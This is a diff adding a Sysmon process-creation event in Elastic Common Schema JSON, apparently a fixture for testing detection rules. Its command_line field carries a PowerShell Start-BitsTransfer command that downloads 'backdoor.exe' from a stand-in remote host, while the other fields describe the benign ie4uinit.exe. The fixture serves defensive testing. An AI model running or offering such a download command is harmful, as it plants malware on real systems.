@@ -1,0 +1,135 @@
+{
+  "@timestamp": "2021-02-04T22:27:21.109Z",
+  "process": {
+    "entity_id": "{19FC45AC-74C9-601C-0000-00105C610100}",
+    "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -Command Start-BitsTransfer -Source http://another.remote/backdoor.exe -Destination C:\\Temp\\thisisfine.exe",
+    "parent": {
+      "name": "explorer.exe",
+      "args": [
+        "C:\\Windows\\Explorer.EXE"
+      ],
+      "entity_id": "{19FC45AC-74C7-601C-0000-0010A7240100}",
+      "pid": 1376,
+      "executable": "C:\\Windows\\explorer.exe",
+      "command_line": "C:\\Windows\\Explorer.EXE"
+    },
+    "name": "ie4uinit.exe",
+    "pid": 1712,
+    "working_directory": "C:\\Windows\\system32\\",
+    "args": [
+      "C:\\Windows\\System32\\ie4uinit.exe",
+      "-UserIconConfig"
+    ],
+    "hash": {
+      "md5": "0ee3bd34729c40bd0853825753acb319",
+      "sha256": "c209e56688588601d947c061446e194ac1a79b9dd0ad38510d0fb9ca200481dd"
+    }
+  },
+  "related": {
+    "user": "setup",
+    "hash": [
+      "0ee3bd34729c40bd0853825753acb319",
+      "c209e56688588601d947c061446e194ac1a79b9dd0ad38510d0fb9ca200481dd"
+    ]
+  },
+  "ecs": {
+    "version": "1.5.0"
+  },
+  "log": {
+    "level": "information"
+  },
+  "event": {
+    "action": "Process Create (rule: ProcessCreate)",
+    "created": "2021-02-04T22:31:13.043Z",
+    "kind": "event",
+    "code": 1,
+    "provider": "Microsoft-Windows-Sysmon",
+    "module": "sysmon",
+    "type": [
+      "start",
+      "process_start"
+    ],
+    "category": [
+      "process"
+    ]
+  },
+  "host": {
+    "ip": [
+      "192.168.56.103",
+      "172.16.1.3",
+      "fe80::5efe:c0a8:3867",
+      "fe80::5efe:ac10:103"
+    ],
+    "name": "CLIENT",
+    "mac": [
+      "00:50:56:00:03:03",
+      "00:50:56:00:00:03",
+      "00:00:00:00:00:00:00:e0",
+      "00:00:00:00:00:00:00:e0"
+    ],
+    "hostname": "CLIENT3",
+    "architecture": "x86",
+    "os": {
+      "platform": "windows",
+      "version": "6.1",
+      "family": "windows",
+      "name": "Windows 7 Professional",
+      "kernel": "6.1.7601.18741 (win7sp1_gdr.150202-1526)",
+      "build": "7601.0"
+    },
+    "id": "19fc45ac-5890-4f96-81b1-50ed111c0ce4"
+  },
+  "message": "Process Create:\nRuleName: \nUtcTime: 2021-02-04 22:27:21.109\nProcessGuid: {19FC45AC-74C9-601C-0000-00105C610100}\nProcessId: 1712\nImage: C:\\Windows\\System32\\ie4uinit.exe\nFileVersion: 8.00.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: IE Per-User Initialization Utility\nProduct: Windows\u00ae Internet Explorer\nCompany: Microsoft Corporation\nOriginalFileName: IE4UINIT.EXE\nCommandLine: \"C:\\Windows\\System32\\ie4uinit.exe\" -UserIconConfig\nCurrentDirectory: C:\\Windows\\system32\\\nUser: client\\setup\nLogonGuid: {19FC45AC-74C6-601C-0000-002031010100}\nLogonId: 0x10131\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: MD5=0EE3BD34729C40BD0853825753ACB319,SHA256=C209E56688588601D947C061446E194AC1A79B9DD0AD38510D0FB9CA200481DD\nParentProcessGuid: {19FC45AC-74C7-601C-0000-0010A7240100}\nParentProcessId: 1376\nParentImage: C:\\Windows\\explorer.exe\nParentCommandLine: C:\\Windows\\Explorer.EXE",
+  "user": {
+    "domain": "client",
+    "name": "setup"
+  },
+  "hash": {
+    "md5": "0ee3bd34729c40bd0853825753acb319",
+    "sha256": "c209e56688588601d947c061446e194ac1a79b9dd0ad38510d0fb9ca200481dd"
+  },
+  "agent": {
+    "hostname": "CLIENT3",
+    "ephemeral_id": "f5ed3d9b-1471-4589-bd70-28219e0f5978",
+    "id": "c58de8d4-8be2-444c-bc20-92fab97cbaf5",
+    "name": "CLIENT3",
+    "type": "winlogbeat",
+    "version": "7.10.2"
+  },
+  "winlog": {
+    "version": 5,
+    "event_data": {
+      "OriginalFileName": "IE4UINIT.EXE",
+      "TerminalSessionId": "1",
+      "Description": "IE Per-User Initialization Utility",
+      "LogonGuid": "{19FC45AC-74C6-601C-0000-002031010100}",
+      "Product": "Windows\u00ae Internet Explorer",
+      "FileVersion": "8.00.7601.17514 (win7sp1_rtm.101119-1850)",
+      "LogonId": "0x10131",
+      "IntegrityLevel": "High",
+      "Company": "Microsoft Corporation"
+    },
+    "task": "Process Create (rule: ProcessCreate)",
+    "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+    "user": {
+      "identifier": "S-1-5-18",
+      "name": "SYSTEM",
+      "domain": "NT AUTHORITY",
+      "type": "User"
+    },
+    "event_id": 1,
+    "api": "wineventlog",
+    "opcode": "Info",
+    "record_id": 1176,
+    "process": {
+      "pid": 1692,
+      "thread": {
+        "id": 1064
+      }
+    },
+    "provider_name": "Microsoft-Windows-Sysmon",
+    "computer_name": "CLIENT",
+    "channel": "Microsoft-Windows-Sysmon/Operational"
+  }
+}
